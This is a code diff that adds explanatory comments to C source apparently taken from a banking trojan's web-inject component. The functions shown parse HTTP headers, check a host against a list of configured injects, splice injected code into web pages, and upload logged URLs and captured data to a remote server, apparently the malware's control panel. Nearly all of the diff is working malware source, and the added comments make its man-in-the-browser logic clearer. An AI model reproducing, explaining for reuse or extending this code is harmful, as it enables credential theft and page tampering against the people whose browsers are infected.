@@ -2,6 +2,7 @@
 #include "..\Panel.h"
 #include "WebInjects.h"
 
+// returns a string between leftPart and rightPart strings (used to parse headers)
 char *FindStrSandwich(char *buf, char *leftPart, char *rightPart)
 {
    char *startStrPos = Funcs::pStrStrIA(buf, leftPart);
@@ -31,6 +32,7 @@ char StrNcmpOrI(const char *str, const char* str2, DWORD maxCount, BOOL ignoreCa
       return Funcs::pStrncmp(str, str2, maxCount);
 }
 
+// simpified regex parser (only asterisk symbol is supported) the first argument is a pattern the second is a string to be checked
 DWORD WildCardStrCmp(char *str, char *str2, BOOL ignoreCase, BOOL checkEnd)
 {
    if(!str || !str2)
@@ -174,6 +176,7 @@ BOOL ReplaceBeforeAfter(char **str2replace, char *strBeforeAfter, char *strRepla
    if (!*str2replace || !strBeforeAfter || !strReplaceBefore || !strReplaceAfter)
       return FALSE;
 
+   // get the address of the first replacement
    char *startStrBeforeAfter;
    DWORD strBeforeAfterLen = WildCardStrStr(*str2replace, strBeforeAfter, &startStrBeforeAfter);
    if (!strBeforeAfterLen)
@@ -188,18 +191,23 @@ BOOL ReplaceBeforeAfter(char **str2replace, char *strBeforeAfter, char *strRepla
       return FALSE;
    Funcs::pMemset(newStr, 0, str2replaceLen + strReplaceBeforeLen + strReplaceAfterLen + 1);
    
+   // copy first part without any changes
    DWORD offset = startStrBeforeAfter - *str2replace;
    Funcs::pMemcpy(newStr, *str2replace, offset);
 
+   // insert the code which should appear before the injected code (this string presented in the original document or it's just an empty string)
    Funcs::pMemcpy(newStr + offset, strReplaceBefore, strReplaceBeforeLen);
    offset += strReplaceBeforeLen;
 
+   // insert the code which should be injected (this code didn't presend in the original document)
    Funcs::pMemcpy(newStr + offset, startStrBeforeAfter, strBeforeAfterLen);
    offset += strBeforeAfterLen;
 
+   // insert the code which should appear after the injected code (this string presented in the original document or it's just an empty string)
    Funcs::pMemcpy(newStr + offset, strReplaceAfter, strReplaceAfterLen);
    offset += strReplaceAfterLen;   
 
+   // insert the rest of the document without any changes
    Funcs::pMemcpy(newStr + offset, startStrBeforeAfter + strBeforeAfterLen, 
       str2replaceLen - (startStrBeforeAfter - *str2replace) - strBeforeAfterLen);
 
@@ -208,11 +216,13 @@ BOOL ReplaceBeforeAfter(char **str2replace, char *strBeforeAfter, char *strRepla
    return TRUE;
 }
 
+// returns the path writen in the first line of http header after a method and before the version
 inline char *GetPath(char *headers)
 {
    return FindStrSandwich(headers, " ", " ");
 }
 
+// returns the host name extacted from the header
 inline char *GetHost(char *headers)
 {
    return FindStrSandwich(headers, Strs::bu3, Strs::winNewLine);
@@ -220,6 +230,7 @@ inline char *GetHost(char *headers)
 
 char *GetUrlHeaders(char *headers, BOOL *inject)
 {
+   // get the url for logging using information extracted from headers
    char *host = NULL, *path = NULL, *url = NULL;
    if((host = GetHost(headers)))
    {
@@ -233,8 +244,10 @@ char *GetUrlHeaders(char *headers, BOOL *inject)
 
 char *GetUrlHostPath(char *host, char *path, BOOL *inject)
 {
+   // check if there are webinjects for current host
    *inject = GetWebInject(host, NULL) != NULL;
    char *url = NULL;
+   // get the url which will be sent on the server
    if(url = (char *) Alloc(lstrlenA(host) + lstrlenA(path) + 20))
    {
       Funcs::pLstrcpyA(url, Strs::bu4);
@@ -246,6 +259,7 @@ char *GetUrlHostPath(char *host, char *path, BOOL *inject)
 
 static DWORD WINAPI UploadThread(LPVOID lpParam)
 {
+   // send a string to the server
    char *postData = (char *) lpParam;
    if(Funcs::pLstrlenA(postData) > 0)
    {
@@ -258,10 +272,13 @@ static DWORD WINAPI UploadThread(LPVOID lpParam)
 
 void UploadLog(char *software, char *url, char *data, BOOL inject)
 {
+   // exit if current host is in the blacklist
    if(UrlIsBlacklisted(url))
       return;
+   // exit if there are no data to send
    if(Funcs::pLstrlenA(data) == 0)
       return;
+   // send log command on the server
    char *postData = (char *) Alloc(Funcs::pLstrlenA(software) + Funcs::pLstrlenA(url) + Funcs::pLstrlenA(data) + 10);
    if(postData)
    {
